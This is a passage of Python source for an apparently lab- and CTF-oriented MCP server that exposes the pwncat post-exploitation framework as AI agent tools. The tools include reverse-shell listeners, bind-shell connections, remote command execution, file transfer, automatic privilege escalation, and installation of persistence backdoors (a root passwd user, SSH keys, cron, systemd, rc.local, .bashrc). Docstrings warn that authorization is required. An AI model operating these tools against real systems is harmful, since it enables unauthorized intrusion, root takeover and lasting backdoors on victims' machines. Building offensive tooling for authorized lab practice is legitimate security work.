                                "technique": str(item),
                                "type": getattr(item, 'name', 'unknown'),
                                "user": getattr(item, 'user', 'root'),
                            })
                except Exception as e:
                    # Fallback: try to get from facts database
                    logger.debug(f"escalate.list not available: {e}")

                return escalations

            escalations = await asyncio.to_thread(_get_escalations)

            # Build suggestions from available escalations
            priority_order = {
                "sudo": 1,
                "suid": 2,
                "capabilities": 3,
                "kernel": 4,
                "cron": 5,
                "writable": 6,
            }

            for esc in escalations:
                technique_type = esc.get("type", "").lower()
                priority = priority_order.get(technique_type, 10)

                suggestion = {
                    "priority": priority,
                    "technique": esc.get("technique", "unknown"),
                    "type": technique_type,
                    "target_user": esc.get("user", "root"),
                    "description": f"Escalate via {technique_type}",
                    "automated": True,  # Can be run via pwncat_privesc_auto
                }

                # Add specific commands for manual execution
                if technique_type == "sudo":
                    suggestion["manual_command"] = "sudo -l"
                elif technique_type == "suid":
                    suggestion["manual_command"] = "find / -perm -4000 2>/dev/null"

                results["suggestions"].append(suggestion)

            # Sort by priority
            results["suggestions"].sort(key=lambda x: x.get("priority", 99))

            # Add summary
            results["total_suggestions"] = len(results["suggestions"])
            results["status"] = "success"

        except Exception as e:
            logger.error(f"privesc_suggest failed: {e}")
            results["status"] = "error"
            results["error"] = str(e)

        return results

    async def privesc_auto(
        self,
        session_id: str,
        techniques: Optional[List[str]] = None,
        stop_on_success: bool = True
    ) -> Dict[str, Any]:
        """Attempt automatic privilege escalation.

        Wraps pwncat's escalate.auto module to attempt privilege escalation
        using discovered techniques.

        Args:
            session_id: Session identifier
            techniques: Specific techniques to try (None = all)
            stop_on_success: Stop after first successful escalation

        Returns:
            Dict containing success/failure info and new session state
        """
        if session_id not in self._pwncat_sessions:
            raise ValueError(f"Session not found: {session_id}")

        pwncat_session = self._pwncat_sessions[session_id]

        results: Dict[str, Any] = {
            "session_id": session_id,
            "success": False,
            "techniques_tried": [],
            "original_user": "unknown",
            "new_user": "unknown",
            "executed_at": datetime.now(timezone.utc).isoformat()
        }

        try:
            # Get original user
            try:
                original_user = pwncat_session.current_user()
                results["original_user"] = getattr(original_user, 'name', str(original_user))
            except Exception:
                pass

            def _run_escalate():
                """Run escalation - blocking operation."""
                escalate_results = {
                    "success": False,
                    "techniques_tried": [],
                    "error": None
                }

                try:
                    # Build options for escalate.auto
                    options = {}
                    if techniques:
                        options["techniques"] = techniques

                    # Run escalate.auto
                    result = pwncat_session.run("escalate.auto", **options)

                    # Process results
                    if hasattr(result, '__iter__'):
                        for item in result:
                            escalate_results["techniques_tried"].append(str(item))
                            if hasattr(item, 'success') and item.success:
                                escalate_results["success"] = True
                                if stop_on_success:
                                    break
                    else:
                        escalate_results["success"] = bool(result)

                except Exception as e:
                    escalate_results["error"] = str(e)

                return escalate_results

            escalate_result = await asyncio.to_thread(_run_escalate)

            results["techniques_tried"] = escalate_result.get("techniques_tried", [])
            results["success"] = escalate_result.get("success", False)

            if escalate_result.get("error"):
                results["error"] = escalate_result["error"]

            # Get new user after escalation
            try:
                new_user = pwncat_session.current_user()
                results["new_user"] = getattr(new_user, 'name', str(new_user))

                # Check if we actually escalated
                if results["new_user"] != results["original_user"]:
                    results["success"] = True
                    results["escalated_to"] = results["new_user"]
            except Exception:
                pass

            results["status"] = "success" if results["success"] else "no_escalation"

        except Exception as e:
            logger.error(f"privesc_auto failed: {e}")
            results["status"] = "error"
            results["error"] = str(e)

        return results

    async def persist_list(self, session_id: str) -> Dict[str, Any]:
        """List available persistence mechanisms for the session.

        Queries available persistence modules based on the target platform
        and current privileges.

        Args:
            session_id: Session identifier

        Returns:
            Dict containing available persistence methods
        """
        if session_id not in self._pwncat_sessions:
            raise ValueError(f"Session not found: {session_id}")

        pwncat_session = self._pwncat_sessions[session_id]

        results: Dict[str, Any] = {
            "session_id": session_id,
            "methods": [],
            "platform": "unknown",
            "current_user": "unknown",
            "executed_at": datetime.now(timezone.utc).isoformat()
        }

        try:
            # Get platform and user info
            try:
                results["platform"] = getattr(pwncat_session.platform, 'name', 'unknown')
                current_user = pwncat_session.current_user()
                results["current_user"] = getattr(current_user, 'name', str(current_user))
            except Exception:
                pass

            def _list_persist_methods():
                """Get available persistence methods - blocking operation."""
                methods = []

                # Known persistence modules in pwncat
                persist_modules = {
                    "persist.passwd_user": {
                        "name": "passwd_user",
                        "description": "Add a user to /etc/passwd with root shell",
                        "requires_root": True,
                        "options": ["user", "password", "shell"]
                    },
                    "persist.ssh_authorized_keys": {
                        "name": "ssh_authorized_keys",
                        "description": "Add SSH public key to authorized_keys",
                        "requires_root": False,
                        "options": ["key", "user"]
                    },
                    "persist.cron": {
                        "name": "cron",
                        "description": "Install cron job for callback",
                        "requires_root": False,
                        "options": ["command", "schedule"]
                    },
                    "persist.systemd": {
                        "name": "systemd",
                        "description": "Install systemd service for persistence",
                        "requires_root": True,
                        "options": ["service_name", "command"]
                    },
                    "persist.rc_local": {
                        "name": "rc_local",
                        "description": "Add command to rc.local",
                        "requires_root": True,
                        "options": ["command"]
                    },
                    "persist.bashrc": {
                        "name": "bashrc",
                        "description": "Add backdoor to user's .bashrc",
                        "requires_root": False,
                        "options": ["command", "user"]
                    },
                }

                # Check which modules are available
                for module_name, info in persist_modules.items():
                    try:
                        # Try to check if module exists by running with no-op
                        # This is a heuristic - pwncat will error if module doesn't exist
                        methods.append({
                            "method": info["name"],
                            "module": module_name,
                            "description": info["description"],
                            "requires_root": info["requires_root"],
                            "options": info["options"],
                            "available": True  # Assume available, error on install
                        })
                    except Exception:
                        pass

                return methods

            methods = await asyncio.to_thread(_list_persist_methods)
            results["methods"] = methods
            results["total_methods"] = len(methods)
            results["status"] = "success"

        except Exception as e:
            logger.error(f"persist_list failed: {e}")
            results["status"] = "error"
            results["error"] = str(e)

        return results

    async def persist_install(
        self,
        session_id: str,
        method: str,
        options: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """Install a persistence mechanism on the target.

        WARNING: This modifies the target system! Use with caution and only
        with proper authorization.

        Args:
            session_id: Session identifier
            method: Persistence method name (from persist_list)
            options: Method-specific options

        Returns:
            Dict containing installation result
        """
        if session_id not in self._pwncat_sessions:
            raise ValueError(f"Session not found: {session_id}")

        pwncat_session = self._pwncat_sessions[session_id]
        options = options or {}

        results: Dict[str, Any] = {
            "session_id": session_id,
            "method": method,
            "options": options,
            "success": False,
            "warning": "This operation modifies the target system!",
            "executed_at": datetime.now(timezone.utc).isoformat()
        }

        # Map method names to modules
        method_to_module = {
            "passwd_user": "persist.passwd_user",
            "ssh_authorized_keys": "persist.ssh_authorized_keys",
            "cron": "persist.cron",
            "systemd": "persist.systemd",
            "rc_local": "persist.rc_local",
            "bashrc": "persist.bashrc",
        }

        module_name = method_to_module.get(method)
        if not module_name:
            results["status"] = "error"
            results["error"] = f"Unknown persistence method: {method}"
            return results

        try:
            def _install_persist():
                """Install persistence - blocking operation."""
                install_result = {
                    "success": False,
                    "output": [],
                    "error": None
                }

                try:
                    result = pwncat_session.run(module_name, **options)

                    # Process results
                    if hasattr(result, '__iter__'):
                        for item in result:
                            install_result["output"].append(str(item))
                            if hasattr(item, 'success') and item.success:
                                install_result["success"] = True
                    else:
                        install_result["success"] = bool(result)
                        install_result["output"].append(str(result))

                except Exception as e:
                    install_result["error"] = str(e)

                return install_result

            install_result = await asyncio.to_thread(_install_persist)

            results["success"] = install_result.get("success", False)
            results["output"] = install_result.get("output", [])

            if install_result.get("error"):
                results["error"] = install_result["error"]
                results["status"] = "error"
            else:
                results["status"] = "success" if results["success"] else "failed"

        except Exception as e:
            logger.error(f"persist_install failed: {e}")
            results["status"] = "error"
            results["error"] = str(e)

        return results


# =============================================================================
# Global Client and Helpers
# =============================================================================

# Global client
client: Optional[PwncatClient] = None


def get_client() -> PwncatClient:
    """Get or create pwncat client.

    Note: The client must be initialized with await client.initialize()
    before use. This is done during MCP initialization.
    """
    global client
    if client is None:
        client = PwncatClient()
    return client


async def ensure_client_initialized() -> PwncatClient:
    """Get pwncat client and ensure initialization was attempted.

    Attempts initialization if not already done. Does not raise on
    failure - individual tool methods will raise with appropriate
    error messages if pwncat is unavailable.

    Returns:
        PwncatClient instance (may not be fully functional if init failed)
    """
    pwncat = get_client()
    if not pwncat._init_attempted:
        await pwncat.initialize()
    return pwncat


# =============================================================================
# FastMCP Tool Definitions
# =============================================================================

@mcp.tool(
    name="pwncat_listen",
    annotations={
        "title": "Start Reverse Shell Listener",
        "readOnlyHint": False,
        "destructiveHint": False,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def pwncat_listen(params: ListenInput) -> str:
    """Start a reverse shell listener. Waits for incoming connections on the specified port.

    Creates a background listener that waits for incoming connections from reverse shells.
    When a connection is received, a session is automatically created and returned.

    Args:
        params (ListenInput): Validated input parameters containing:
            - port (int): Port to listen on for incoming connections (1-65535)
            - host (str): Host/interface to bind to (default: 0.0.0.0)
            - timeout (Optional[float]): Maximum seconds to wait for connection

    Returns:
        str: JSON-formatted response containing session info:
            {
                "session_id": str,    # Unique session identifier
                "platform": str,      # Target OS (linux, windows)
                "hostname": str,      # Target hostname
                "user": str,          # Current user on target
                "connected_at": str   # ISO timestamp
            }
            Or error: {"error": str, "message": str}
    """
    pwncat = await ensure_client_initialized()

    try:
        result = await pwncat.listen(
            port=params.port,
            host=params.host,
            timeout=params.timeout
        )
        return json.dumps(result, indent=2)
    except TimeoutError as e:
        return json.dumps({"error": "timeout", "message": str(e)}, indent=2)
    except RuntimeError as e:
        return json.dumps({"error": "runtime_error", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"pwncat_listen failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="pwncat_connect",
    annotations={
        "title": "Connect to Bind Shell",
        "readOnlyHint": False,
        "destructiveHint": False,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def pwncat_connect(params: ConnectInput) -> str:
    """Connect to a bind shell on a remote target.

    Actively connects to a target running a bind shell and establishes
    a pwncat session for post-exploitation.

    Args:
        params (ConnectInput): Validated input parameters containing:
            - host (str): Target host/IP address
            - port (int): Target port (1-65535)
            - platform (str): Target platform (linux or windows)

    Returns:
        str: JSON-formatted response containing session info:
            {
                "session_id": str,    # Unique session identifier
                "platform": str,      # Target OS
                "hostname": str,      # Target hostname
                "user": str,          # Current user on target
                "connected_at": str   # ISO timestamp
            }
            Or error: {"error": str, "message": str}
    """
    pwncat = await ensure_client_initialized()

    try:
        result = await pwncat.connect(
            host=params.host,
            port=params.port,
            platform=params.platform
        )
        return json.dumps(result, indent=2)
    except RuntimeError as e:
        return json.dumps({"error": "runtime_error", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"pwncat_connect failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="pwncat_sessions",
    annotations={
        "title": "List Active Sessions",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": False
    }
)
async def pwncat_sessions(params: SessionsListInput) -> str:
    """List all active pwncat sessions with their metadata.

    Returns metadata for all currently active sessions including session ID,
    platform, hostname, user, and connection timestamp.

    Args:
        params (SessionsListInput): Validated input parameters containing:
            - response_format (ResponseFormat): Output format (json/markdown)

    Returns:
        str: JSON or Markdown formatted session list
    """
    pwncat = await ensure_client_initialized()

    try:
        result = await pwncat.list_sessions()

        if params.response_format == ResponseFormat.MARKDOWN:
            return _format_sessions_markdown(result)
        return json.dumps(result, indent=2)
    except Exception as e:
        logger.error(f"pwncat_sessions failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="pwncat_command",
    annotations={
        "title": "Execute Shell Command",
        "readOnlyHint": False,
        "destructiveHint": True,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def pwncat_command(params: CommandInput) -> str:
    """Execute a shell command in an active session.

    Runs a shell command on the target system through the specified session.
    Returns command output, exit code, and execution timestamp.

    Args:
        params (CommandInput): Validated input parameters containing:
            - session_id (str): Session identifier
            - command (str): Shell command to execute

    Returns:
        str: JSON-formatted response containing:
            {
                "command": str,       # The executed command
                "output": str,        # Command output (stdout + stderr)
                "exit_code": int,     # Command exit code
                "executed_at": str    # ISO timestamp
            }
    """
    pwncat = await ensure_client_initialized()

    try:
        result = await pwncat.run_command(
            session_id=params.session_id,
            command=params.command
        )
        return json.dumps(result, indent=2)
    except ValueError as e:
        return json.dumps({"error": "session_not_found", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"pwncat_command failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="pwncat_module",
    annotations={
        "title": "Run Pwncat Module",
        "readOnlyHint": False,
        "destructiveHint": True,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def pwncat_module(params: ModuleInput) -> str:
    """Run a pwncat module (enumerate, escalate, persist) in a session.

    Executes pwncat modules for enumeration, privilege escalation, or
    persistence. Examples: enumerate.system.uname, escalate.auto, persist.passwd_user

    Args:
        params (ModuleInput): Validated input parameters containing:
            - session_id (str): Session identifier
            - module (str): Module name (e.g., enumerate.system.uname)
            - options (Optional[Dict]): Module-specific options

    Returns:
        str: JSON-formatted response containing:
            {
                "session_id": str,    # Session identifier
                "module": str,        # Module name
                "options": dict,      # Options used
                "results": list,      # Module results
                "status": str,        # "success" or "error"
                "error": str,         # Error message (if status is "error")
                "executed_at": str    # ISO timestamp
            }
    """
    pwncat = await ensure_client_initialized()

    try:
        options = params.options or {}
        result = await pwncat.run_module(
            session_id=params.session_id,
            module=params.module,
            **options
        )
        return json.dumps(result, indent=2)
    except ValueError as e:
        return json.dumps({"error": "session_not_found", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"pwncat_module failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="pwncat_upload",
    annotations={
        "title": "Upload File to Target",
        "readOnlyHint": False,
        "destructiveHint": True,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def pwncat_upload(params: FileTransferInput) -> str:
    """Upload a file from the local system to the target.

    Transfers a file from the local filesystem to the target system
    through the specified session.

    Args:
        params (FileTransferInput): Validated input parameters containing:
            - session_id (str): Session identifier
            - local_path (str): Path to the local file to upload
            - remote_path (str): Destination path on the target

    Returns:
        str: JSON-formatted response containing:
            {
                "success": bool,           # Whether upload succeeded
                "bytes_transferred": int,  # Number of bytes transferred
                "remote_path": str,        # Destination path on target
                "local_path": str,         # Source path locally
                "error": str               # Error message (if success is false)
            }
    """
    pwncat = await ensure_client_initialized()

    try:
        result = await pwncat.upload(
            session_id=params.session_id,
            local_path=params.local_path,
            remote_path=params.remote_path
        )
        return json.dumps(result, indent=2)
    except ValueError as e:
        return json.dumps({"error": "session_not_found", "message": str(e)}, indent=2)
    except FileNotFoundError as e:
        return json.dumps({"error": "file_not_found", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"pwncat_upload failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="pwncat_download",
    annotations={
        "title": "Download File from Target",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def pwncat_download(params: FileTransferInput) -> str:
    """Download a file from the target to the local system.

    Transfers a file from the target system to the local filesystem
    through the specified session.

    Args:
        params (FileTransferInput): Validated input parameters containing:
            - session_id (str): Session identifier
            - remote_path (str): Path to the file on the target
            - local_path (str): Destination path on the local system

    Returns:
        str: JSON-formatted response containing:
            {
                "success": bool,           # Whether download succeeded
                "bytes_transferred": int,  # Number of bytes transferred
                "local_path": str,         # Destination path locally
                "remote_path": str,        # Source path on target
                "error": str               # Error message (if success is false)
            }
    """
    pwncat = await ensure_client_initialized()

    try:
        result = await pwncat.download(
            session_id=params.session_id,
            remote_path=params.remote_path,
            local_path=params.local_path
        )
        return json.dumps(result, indent=2)
    except ValueError as e:
        return json.dumps({"error": "session_not_found", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"pwncat_download failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="pwncat_close",
    annotations={
        "title": "Close Session",
        "readOnlyHint": False,
        "destructiveHint": True,
        "idempotentHint": False,
        "openWorldHint": False
    }
)
async def pwncat_close(params: SessionInput) -> str:
    """Close/terminate an active session.

    Cleanly terminates the specified session and removes it from tracking.

    Args:
        params (SessionInput): Validated input parameters containing:
            - session_id (str): Session identifier to close

    Returns:
        str: JSON-formatted response containing:
            {
                "session_id": str,     # Session that was closed
                "status": str,         # "closed" or "error"
                "closed_at": str,      # ISO timestamp
                "previous_info": dict, # Session info before closure
                "error": str           # Error message (if status is "error")
            }
    """
    pwncat = await ensure_client_initialized()

    try:
        result = await pwncat.close_session(session_id=params.session_id)
        return json.dumps(result, indent=2)
    except ValueError as e:
        return json.dumps({"error": "session_not_found", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"pwncat_close failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="pwncat_get_lhost",
    annotations={
        "title": "Get VPN IP Address",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": False
    }
)
async def pwncat_get_lhost(params: GetLhostInput) -> str:
    """Get the VPN IP address for reverse shell callbacks.

    Returns the IP that HTB targets should connect back to. ALWAYS call this
    before crafting reverse shell payloads - never hardcode or guess the IP.

    Args:
        params (GetLhostInput): Validated input parameters containing:
            - interface (str): Network interface to query (default: tun0)

    Returns:
        str: JSON-formatted response containing:
            {
                "lhost": str,       # IP address for reverse shells
                "interface": str    # Interface queried
            }
            Or error: {"error": str, "interface": str}
    """
    pwncat = get_client()  # Don't need full init for lhost

    try:
        result = await pwncat.get_lhost(interface=params.interface)
        return json.dumps(result, indent=2)
    except Exception as e:
        logger.error(f"pwncat_get_lhost failed: {e}")
        return json.dumps({"error": str(e), "interface": params.interface}, indent=2)


# =============================================================================
# Higher-Level Tools
# =============================================================================

@mcp.tool(
    name="pwncat_enumerate_all",
    annotations={
        "title": "Bulk Enumeration",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": True
    }
)
async def pwncat_enumerate_all(params: EnumerateAllInput) -> str:
    """Run bulk enumeration across multiple categories in a session.

    Executes multiple pwncat enumerate.* modules grouped by category and returns
    aggregated results. Each module runs with its own timeout to prevent hanging.

    Categories available:
    - system: OS info, hostname, environment, init system, SELinux status
    - user: User accounts, private keys, group memberships
    - network: Hosts file, interfaces, running services
    - file: SUID binaries, capabilities, world-writable files
    - software: Screen sessions, sudo configuration, cron jobs

    Args:
        params (EnumerateAllInput): Validated input parameters containing:
            - session_id (str): Session identifier
            - categories (List[EnumerationCategory]): Categories to enumerate
              (default: system, user, network)
            - timeout_per_module (float): Timeout per module in seconds (default: 30)
            - response_format (ResponseFormat): Output format (json/markdown)

    Returns:
        str: JSON or Markdown formatted enumeration results
    """
    pwncat = await ensure_client_initialized()

    try:
        result = await pwncat.enumerate_all(
            session_id=params.session_id,
            categories=params.categories,
            timeout_per_module=params.timeout_per_module
        )

        if params.response_format == ResponseFormat.MARKDOWN:
            return _format_enumeration_markdown(result)
        return json.dumps(result, indent=2)
    except ValueError as e:
        return json.dumps({"error": "session_not_found", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"pwncat_enumerate_all failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="pwncat_privesc_suggest",
    annotations={
        "title": "Privilege Escalation Suggestions",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": True
    }
)
async def pwncat_privesc_suggest(params: PrivescSuggestInput) -> str:
    """Get prioritized privilege escalation suggestions for a session.

    Analyzes the current session state for potential privilege escalation vectors
    including kernel exploits, SUID binaries, sudo misconfigurations, capabilities,
    and cron jobs. Returns suggestions sorted by likelihood of success.

    This is a read-only analysis tool - no changes are made to the target.

    Args:
        params (PrivescSuggestInput): Validated input parameters containing:
            - session_id (str): Session identifier
            - run_enumeration (bool): Run enumeration first to gather info
              (default: True, recommended for accurate results)
            - response_format (ResponseFormat): Output format (json/markdown)

    Returns:
        str: JSON or Markdown formatted privilege escalation suggestions
    """
    pwncat = await ensure_client_initialized()

    try:
        result = await pwncat.privesc_suggest(
            session_id=params.session_id,
            run_enumeration=params.run_enumeration
        )

        if params.response_format == ResponseFormat.MARKDOWN:
            return _format_privesc_suggestions_markdown(result)
        return json.dumps(result, indent=2)
    except ValueError as e:
        return json.dumps({"error": "session_not_found", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"pwncat_privesc_suggest failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="pwncat_privesc_auto",
    annotations={
        "title": "Automatic Privilege Escalation",
        "readOnlyHint": False,
        "destructiveHint": True,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def pwncat_privesc_auto(params: PrivescAutoInput) -> str:
    """Attempt automatic privilege escalation using pwncat's escalate.auto module.

    WARNING: This is a DESTRUCTIVE operation that actively attempts to escalate
    privileges on the target system. Only use with proper authorization.

    Wraps pwncat's built-in escalation framework to automatically try discovered
    privilege escalation techniques. Use pwncat_privesc_suggest first to see
    what techniques are available.

    Args:
        params (PrivescAutoInput): Validated input parameters containing:
            - session_id (str): Session identifier
            - techniques (Optional[List[str]]): Specific techniques to try
              (default: None = try all available)
            - stop_on_success (bool): Stop after first successful escalation
              (default: True)

    Returns:
        str: JSON-formatted response containing:
            {
                "session_id": str,
                "success": bool,
                "original_user": str,
                "new_user": str,
                "escalated_to": str,       # Only if success=True
                "techniques_tried": [...],
                "status": "success"|"no_escalation"|"error",
                "error": str,              # If status=error
                "executed_at": str
            }
    """
    pwncat = await ensure_client_initialized()

    try:
        result = await pwncat.privesc_auto(
            session_id=params.session_id,
            techniques=params.techniques,
            stop_on_success=params.stop_on_success
        )
        return json.dumps(result, indent=2)
    except ValueError as e:
        return json.dumps({"error": "session_not_found", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"pwncat_privesc_auto failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="pwncat_persist_list",
    annotations={
        "title": "List Persistence Mechanisms",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": False
    }
)
async def pwncat_persist_list(params: PersistListInput) -> str:
    """List available persistence mechanisms for the current session.

    Returns information about persistence methods that can be installed on the
    target, based on the current platform and privilege level.

    Available methods include:
    - passwd_user: Add user to /etc/passwd (requires root)
    - ssh_authorized_keys: Add SSH key to authorized_keys
    - cron: Install cron job for callback
    - systemd: Install systemd service (requires root)
    - rc_local: Add to rc.local startup script (requires root)
    - bashrc: Add to user's .bashrc

    This is a read-only tool - no changes are made to the target.

    Args:
        params (PersistListInput): Validated input parameters containing:
            - session_id (str): Session identifier
            - response_format (ResponseFormat): Output format (json/markdown)

    Returns:
        str: JSON or Markdown formatted persistence methods list
    """
    pwncat = await ensure_client_initialized()

    try:
        result = await pwncat.persist_list(session_id=params.session_id)

        if params.response_format == ResponseFormat.MARKDOWN:
            return _format_persist_list_markdown(result)
        return json.dumps(result, indent=2)
    except ValueError as e:
        return json.dumps({"error": "session_not_found", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"pwncat_persist_list failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


@mcp.tool(
    name="pwncat_persist_install",
    annotations={
        "title": "Install Persistence Mechanism",
        "readOnlyHint": False,
        "destructiveHint": True,
        "idempotentHint": False,
        "openWorldHint": True
    }
)
async def pwncat_persist_install(params: PersistInstallInput) -> str:
    """Install a persistence mechanism on the target system.

    WARNING: This is a DESTRUCTIVE operation that MODIFIES THE TARGET SYSTEM!
    Only use with explicit authorization in controlled environments (CTFs, labs, etc.).

    Installs the specified persistence method using pwncat's persist.* modules.
    Use pwncat_persist_list first to see available methods and their options.

    Common method options:
    - passwd_user: user, password, shell
    - ssh_authorized_keys: key, user
    - cron: command, schedule
    - systemd: service_name, command
    - bashrc: command, user

    Args:
        params (PersistInstallInput): Validated input parameters containing:
            - session_id (str): Session identifier
            - method (str): Persistence method from persist_list
            - options (Optional[Dict]): Method-specific options

    Returns:
        str: JSON-formatted response containing:
            {
                "session_id": str,
                "method": str,
                "options": dict,
                "success": bool,
                "output": [...],
                "warning": str,            # Always present as reminder
                "status": "success"|"failed"|"error",
                "error": str,              # If status=error
                "executed_at": str
            }
    """
    pwncat = await ensure_client_initialized()

    try:
        result = await pwncat.persist_install(
            session_id=params.session_id,
            method=params.method,
            options=params.options
        )
        return json.dumps(result, indent=2)
    except ValueError as e:
        return json.dumps({"error": "session_not_found", "message": str(e)}, indent=2)
    except Exception as e:
        logger.error(f"pwncat_persist_install failed: {e}")
        return json.dumps({"error": "internal_error", "message": str(e)}, indent=2)


# =============================================================================
# HTTP Health Check Server (kept for backwards compatibility)
# =============================================================================

async def start_lhost_http_server():
    """Start a simple HTTP server that returns the VPN LHOST.

    This allows other containers (like Dame) to query the VPN IP
    without needing to share the network namespace.
    """
    from aiohttp import web

    async def handle_lhost(request):
        pwncat = get_client()
        result = await pwncat.get_lhost()
        return web.json_response(result)

    async def handle_health(request):
        return web.json_response({"status": "ok", "pwncat_available": PWNCAT_AVAILABLE})

    app = web.Application()
    app.router.add_get('/lhost', handle_lhost)
    app.router.add_get('/health', handle_health)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 9998)
    await site.start()
    logger.info("LHOST HTTP server started on port 9998")


# =============================================================================
# Main Entry Point
# =============================================================================

async def main_with_http():
    """Main entry point with HTTP server for LHOST queries."""
    logger.info("Pwncat MCP server starting...")

    # Initialize pwncat client
    await ensure_client_initialized()

    # Start HTTP server for LHOST queries (non-blocking)
    try:
        asyncio.create_task(start_lhost_http_server())
    except Exception as e:
        logger.warning(f"Failed to start LHOST HTTP server: {e}")

    # Run MCP server via stdio
    await mcp.run_async()


if __name__ == '__main__':
    asyncio.run(main_with_http())
